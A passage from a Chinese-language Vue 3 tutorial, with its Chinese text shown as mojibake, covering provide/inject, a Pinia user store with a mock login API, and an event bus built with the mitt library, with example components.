  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-profile"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ç”¨æˆ·ä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"profile-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å§“åï¼š{{ currentUser.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è§’è‰²ï¼š{{ currentUser.role }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æƒé™ï¼š{{ userPermissions.join(', ') }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä¸»é¢˜ï¼š{{ appConfig.theme }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleUpdateProfile"</span>&gt;</span>æ›´æ–°èµ„æ–™<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { inject } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// æ³¨å…¥æ•°æ®å’Œæ–¹æ³•</span>
<span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'currentUser'</span>)
<span class="hljs-keyword">const</span> appConfig = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'appConfig'</span>)
<span class="hljs-keyword">const</span> userPermissions = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'userPermissions'</span>)
<span class="hljs-keyword">const</span> updateUser = <span class="hljs-title function_">inject</span>(<span class="hljs-string">'updateUser'</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUpdateProfile</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">updateUser</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'æå››'</span>,
    <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>Provide/Injectçš„ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é¿å…Propsé€å±‚ä¼ é€’çš„ç¹ç</li>
<li>å®ç°è·¨å±‚çº§ç»„ä»¶é€šä¿¡</li>
<li>æä¾›å…¨å±€çŠ¶æ€å’Œæ–¹æ³•çš„ç»Ÿä¸€ç®¡ç†</li>
<li>æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå½“æ•°æ®éœ€è¦ä»é¡¶å±‚ç»„ä»¶ä¼ é€’åˆ°åº•å±‚ç»„ä»¶ï¼Œä¸­é—´éš”äº†å¥½å‡ å±‚ï¼ˆæ¯”å¦‚ä¸»é¢˜ã€ç”¨æˆ·ä¿¡æ¯ã€è¯­è¨€è®¾ç½®ï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-7">5. Piniaï¼šç°ä»£åŒ–çŠ¶æ€ç®¡ç†</h2>
<p>å¯¹äºå¤æ‚åº”ç”¨ï¼ŒPinia æä¾›äº†æ›´ä¼˜ç§€çš„çŠ¶æ€ç®¡ç†æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-8">åˆ›å»º Store</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// stores/user.js</span>
<span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">user</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">token</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">permissions</span>: []
  }),
  
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-attr">userName</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">user</span>?.<span class="hljs-property">name</span> || <span class="hljs-string">'æœªç™»å½•ç”¨æˆ·'</span>,
    <span class="hljs-attr">isAdmin</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">user</span>?.<span class="hljs-property">role</span> === <span class="hljs-string">'admin'</span>,
    <span class="hljs-attr">hasPermission</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params">permission</span>) =&gt;</span> 
      state.<span class="hljs-property">permissions</span>.<span class="hljs-title function_">includes</span>(permission)
  },
  
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">credentials</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ¨¡æ‹Ÿ API è°ƒç”¨</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">mockLoginApi</span>(credentials)
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = response.<span class="hljs-property">user</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = response.<span class="hljs-property">token</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> = <span class="hljs-literal">true</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">permissions</span> = response.<span class="hljs-property">permissions</span>
        
        <span class="hljs-comment">// ä¿å­˜åˆ° localStorage</span>
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'token'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>)
        
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> }
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ç™»å½•å¤±è´¥ï¼š'</span>, error)
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> }
      }
    },
    
    <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = <span class="hljs-literal">null</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = <span class="hljs-string">''</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span> = <span class="hljs-literal">false</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">permissions</span> = []
      
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>)
    },
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">updateProfile</span>(<span class="hljs-params">userData</span>) {
      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isLoggedIn</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'è¯·å…ˆç™»å½•'</span>)
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span>, ...userData }
      <span class="hljs-comment">// è¿™é‡Œå¯ä»¥è°ƒç”¨ API æ›´æ–°åç«¯æ•°æ®</span>
    }
  }
})

<span class="hljs-comment">// æ¨¡æ‹Ÿç™»å½• API</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">mockLoginApi</span> = (<span class="hljs-params">credentials</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>({
        <span class="hljs-attr">user</span>: {
          <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
          <span class="hljs-attr">name</span>: credentials.<span class="hljs-property">username</span>,
          <span class="hljs-attr">role</span>: <span class="hljs-string">'admin'</span>
        },
        <span class="hljs-attr">token</span>: <span class="hljs-string">'mock-jwt-token'</span>,
        <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'read'</span>, <span class="hljs-string">'write'</span>, <span class="hljs-string">'delete'</span>]
      })
    }, <span class="hljs-number">1000</span>)
  })
}
</code></pre>
<h3 data-id="heading-9">åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ Store</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- UserProfile.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-profile"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"userStore.isLoggedIn"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logged-in"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æ¬¢è¿å›æ¥ï¼Œ{{ userStore.userName }}ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-info"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è§’è‰²ï¼š{{ userStore.user.role }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æƒé™ï¼š{{ userStore.permissions.join(', ') }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"actions"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
          @<span class="hljs-attr">click</span>=<span class="hljs-string">"updateName"</span> 
          <span class="hljs-attr">:disabled</span>=<span class="hljs-string">"!userStore.hasPermission('write')"</span>
        &gt;</span>
          æ›´æ–°å§“å
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"userStore.logout"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logout-btn"</span>&gt;</span>
          é€€å‡ºç™»å½•
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logged-out"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">LoginForm</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/stores/user'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">LoginForm</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./LoginForm.vue'</span>

<span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateName</span> = (<span class="hljs-params"/>) =&gt; {
  userStore.<span class="hljs-title function_">updateProfile</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">`ç”¨æˆ·<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).substr(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>)}</span>`</span>
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- LoginForm.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-form"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> @<span class="hljs-attr">submit.prevent</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
          <span class="hljs-attr">v-model</span>=<span class="hljs-string">"credentials.username"</span> 
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"ç”¨æˆ·å"</span>
          <span class="hljs-attr">required</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
          <span class="hljs-attr">v-model</span>=<span class="hljs-string">"credentials.password"</span> 
          <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> 
          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"å¯†ç "</span>
          <span class="hljs-attr">required</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">:disabled</span>=<span class="hljs-string">"loading"</span>&gt;</span>
        {{ loading ? 'ç™»å½•ä¸­...' : 'ç™»å½•' }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"messageType"</span>&gt;</span>
      {{ message }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/stores/user'</span>

<span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()

<span class="hljs-keyword">const</span> credentials = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>
})

<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> message = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> messageType = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  message.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> userStore.<span class="hljs-title function_">login</span>(credentials)
  
  <span class="hljs-keyword">if</span> (result.<span class="hljs-property">success</span>) {
    message.<span class="hljs-property">value</span> = <span class="hljs-string">'ç™»å½•æˆåŠŸï¼'</span>
    messageType.<span class="hljs-property">value</span> = <span class="hljs-string">'success'</span>
  } <span class="hljs-keyword">else</span> {
    message.<span class="hljs-property">value</span> = <span class="hljs-string">`ç™»å½•å¤±è´¥ï¼š<span class="hljs-subst">${result.error}</span>`</span>
    messageType.<span class="hljs-property">value</span> = <span class="hljs-string">'error'</span>
  }
  
  loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>Pinia</code> ä¼˜åŠ¿ï¼š</p>
<ul>
<li>æ—  mutationsï¼Œç›´æ¥ä¿®æ”¹ state</li>
<li>å®Œç¾æ”¯æŒ TypeScript</li>
<li>DevTools è°ƒè¯•å‹å¥½</li>
<li>æ¨¡å—åŒ–è®¾è®¡ï¼Œæ˜“äºæ‹†åˆ†</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šä¸­å¤§å‹åº”ç”¨ï¼Œå¤šä¸ªç»„ä»¶éœ€è¦å…±äº«å¤æ‚çŠ¶æ€ï¼ˆå¦‚ç”¨æˆ·ç™»å½•æ€ã€è´­ç‰©è½¦ã€å…¨å±€é…ç½®ï¼‰ã€‚</p>
<h2 data-id="heading-10">6. äº‹ä»¶æ€»çº¿ï¼šè½»é‡çº§å…¨å±€é€šä¿¡</h2>
<p>Vue3 ç§»é™¤äº†å®ä¾‹ä¸Šçš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>n</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">onã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">ã€</span></span></span></span></span>off æ–¹æ³•ï¼Œä¸å†æ”¯æŒè¿™ç§æ¨¡å¼ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ mitt åº“å®ç°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/eventBus.js</span>
<span class="hljs-keyword">import</span> mitt <span class="hljs-keyword">from</span> <span class="hljs-string">'mitt'</span>

<span class="hljs-comment">// åˆ›å»ºå…¨å±€äº‹ä»¶æ€»çº¿</span>
<span class="hljs-keyword">const</span> eventBus = <span class="hljs-title function_">mitt</span>()

<span class="hljs-comment">// å®šä¹‰äº‹ä»¶ç±»å‹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">EVENTS</span> = {
  <span class="hljs-attr">USER_LOGIN</span>: <span class="hljs-string">'user:login'</span>,
  <span class="hljs-attr">USER_LOGOUT</span>: <span class="hljs-string">'user:logout'</span>,
  <span class="hljs-attr">NOTIFICATION_SHOW</span>: <span class="hljs-string">'notification:show'</span>,
  <span class="hljs-attr">MODAL_OPEN</span>: <span class="hljs-string">'modal:open'</span>,
  <span class="hljs-attr">THEME_CHANGE</span>: <span class="hljs-string">'theme:change'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> eventBus
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å‘å¸ƒäº‹ä»¶çš„ç»„ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"publisher"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>äº‹ä»¶å‘å¸ƒè€…<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"buttons"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"sendNotification"</span>&gt;</span>å‘é€é€šçŸ¥<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"openModal"</span>&gt;</span>æ‰“å¼€æ¨¡æ€æ¡†<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"changeTheme"</span>&gt;</span>åˆ‡æ¢ä¸»é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> eventBus, { <span class="hljs-variable constant_">EVENTS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/eventBus'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">sendNotification</span> = (<span class="hljs-params"/>) =&gt; {
  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>, {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'success'</span>,
    <span class="hljs-attr">title</span>: <span class="hljs-string">'æ“ä½œæˆåŠŸ'</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">'è¿™æ˜¯ä¸€ä¸ªæ¥è‡ªäº‹ä»¶æ€»çº¿çš„é€šçŸ¥'</span>,
    <span class="hljs-attr">duration</span>: <span class="hljs-number">3000</span>
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">openModal</span> = (<span class="hljs-params"/>) =&gt; {
  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>, {
    <span class="hljs-attr">component</span>: <span class="hljs-string">'UserForm'</span>,
    <span class="hljs-attr">props</span>: { <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span> },
    <span class="hljs-attr">title</span>: <span class="hljs-string">'ç”¨æˆ·è¡¨å•'</span>
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeTheme</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> themes = [<span class="hljs-string">'light'</span>, <span class="hljs-string">'dark'</span>, <span class="hljs-string">'blue'</span>]
  <span class="hljs-keyword">const</span> randomTheme = themes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * themes.<span class="hljs-property">length</span>)]
  
  eventBus.<span class="hljs-title function_">emit</span>(<span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>, {
    <span class="hljs-attr">theme</span>: randomTheme,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- ç›‘å¬äº‹ä»¶çš„ç»„ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"listener"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>äº‹ä»¶ç›‘å¬è€…<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"events-log"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
        <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(event, index) in events"</span> 
        <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>
        <span class="hljs-attr">class</span>=<span class="hljs-string">"event-item"</span>
      &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>{{ event.type }}<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ event.data }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>{{ event.timestamp }}<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> eventBus, { <span class="hljs-variable constant_">EVENTS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/eventBus'</span>

<span class="hljs-keyword">const</span> events = <span class="hljs-title function_">ref</span>([])

<span class="hljs-comment">// äº‹ä»¶å¤„ç†å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNotification</span> = (<span class="hljs-params">data</span>) =&gt; {
  events.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">NOTIFICATION_SHOW</span>,
    <span class="hljs-attr">data</span>: <span class="hljs-string">`é€šçŸ¥: <span class="hljs-subst">${data.title}</span> - <span class="hljs-subst">${data.message}</span>`</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>()
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleModalOpen</span> = (<span class="hljs-params">data</span>) =&gt; {
  events.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">MODAL_OPEN</span>,
    <span class="hljs-attr">data</span>: <span class="hljs-string">`æ‰“å¼€æ¨¡æ€æ¡†: <span class="hljs-subst">${data.component}</span>`</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>()
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleThemeChange</span> = (<span class="hljs-params">data</span>) =&gt; {
  events.<span class="hljs-property">value</span>.<span class="hljs-title function_">unshift</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-variable constant_">EVENTS</span>.<span class="hljs-property">THEME_CHANGE</span>,
    <span class="hljs-attr">data</span>: <span class="hljs-string">`ä¸»é¢˜åˆ‡æ¢ä¸º: <span class="hljs-subst">${data.theme}</span>`</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleTimeString</span>()
  })
}

<span class="hljs-comment">// æ³¨å†Œäº‹ä»¶ç›‘å¬</span>
